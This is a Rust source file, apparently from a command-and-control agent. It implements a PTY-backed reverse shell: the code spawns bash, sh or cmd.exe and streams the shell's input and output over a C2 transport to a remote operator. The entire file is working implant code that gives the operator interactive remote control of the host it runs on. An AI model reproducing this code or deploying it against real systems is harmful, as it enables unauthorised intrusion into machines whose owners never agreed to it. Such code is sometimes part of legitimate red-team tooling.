use anyhow::Result;
use pb::c2::{ReverseShellMessageKind, ReverseShellRequest};
use portable_pty::{native_pty_system, CommandBuilder, PtySize};
use std::io::{Read, Write};
use transport::SyncTransport;
use alloc::string::String;
use alloc::sync::Arc;
use alloc::vec::Vec;
use std::sync::mpsc::{self, Receiver, Sender};
use std::thread;

#[cfg(not(target_os = "windows"))]
use std::path::Path;

pub fn reverse_shell_pty(transport: Arc<dyn SyncTransport>, task_id: i64, cmd: Option<String>) -> Result<()> {
    // Channels for transport stream
    let (transport_tx_req, transport_rx_req) = mpsc::channel();
    let (transport_tx_resp, transport_rx_resp) = mpsc::channel();

    #[cfg(debug_assertions)]
    log::info!("starting reverse_shell_pty (task_id={task_id})");

    // Start transport loop in background (SyncTransport::reverse_shell spawns its own task)
    // We pass the channels to it.
    transport.reverse_shell(transport_rx_req, transport_tx_resp)?;

    // Send initial registration
    let _ = transport_tx_req.send(ReverseShellRequest {
        task_id,
        kind: ReverseShellMessageKind::Ping.into(),
        data: Vec::new(),
    });

    // Use the native pty implementation for the system
    let pty_system = native_pty_system();

    // Create a new pty
    let pair = match pty_system.openpty(PtySize {
        rows: 24,
        cols: 80,
        pixel_width: 0,
        pixel_height: 0,
    }) {
        Ok(p) => p,
        Err(e) => return Err(anyhow::anyhow!(e)),
    };

    // Spawn command into the pty
    let cmd_builder = match cmd {
        Some(c) => CommandBuilder::new(c),
        None => {
            #[cfg(not(target_os = "windows"))]
            {
                if Path::new("/bin/bash").exists() {
                    CommandBuilder::new("/bin/bash")
                } else {
                    CommandBuilder::new("/bin/sh")
                }
            }
            #[cfg(target_os = "windows")]
            CommandBuilder::new("cmd.exe")
        }
    };

    let mut child = match pair.slave.spawn_command(cmd_builder) {
        Ok(c) => c,
        Err(e) => return Err(anyhow::anyhow!(e)),
    };

    let mut reader = pair.master.try_clone_reader().map_err(|e| anyhow::anyhow!(e))?;
    let mut writer = pair.master.take_writer().map_err(|e| anyhow::anyhow!(e))?;

    // Spawn thread to read PTY and send to transport
    let transport_tx_req_clone = transport_tx_req.clone();
    let pty_reader_thread = thread::spawn(move || {
        const CHUNK_SIZE: usize = 1024;
        let mut buffer = [0; CHUNK_SIZE];
        loop {
             match reader.read(&mut buffer[..]) {
                Ok(n) if n > 0 => {
                    let req = ReverseShellRequest {
                        kind: ReverseShellMessageKind::Data.into(),
                        data: buffer[..n].to_vec(),
                        task_id,
                    };
                    if transport_tx_req_clone.send(req).is_err() {
                        break;
                    }

                    // Ping to flush (from original impl)
                    let ping = ReverseShellRequest {
                        kind: ReverseShellMessageKind::Ping.into(),
                        data: Vec::new(),
                        task_id,
                    };
                     if transport_tx_req_clone.send(ping).is_err() {
                        break;
                    }
                }
                _ => break,
            }
        }
    });

    // Handle Input from transport to PTY
    loop {
        // Check if child process is still alive
        if let Ok(Some(_)) = child.try_wait() {
             break;
        }

        // Blocking receive
        if let Ok(msg) = transport_rx_resp.recv() {
             if msg.kind == ReverseShellMessageKind::Ping as i32 {
                // Echo ping
                 let req = ReverseShellRequest {
                    kind: ReverseShellMessageKind::Ping.into(),
                    data: msg.data,
                    task_id,
                };
                if transport_tx_req.send(req).is_err() {
                     break;
                }
                continue;
            }

            if writer.write_all(&msg.data).is_err() {
                break;
            }
        } else {
            // Transport closed
             let _ = child.kill();
            break;
        }
    }

    let _ = child.kill();
    let _ = pty_reader_thread.join();

    #[cfg(debug_assertions)]
    log::info!("stopping reverse_shell_pty (task_id={task_id})");
    Ok(())
}
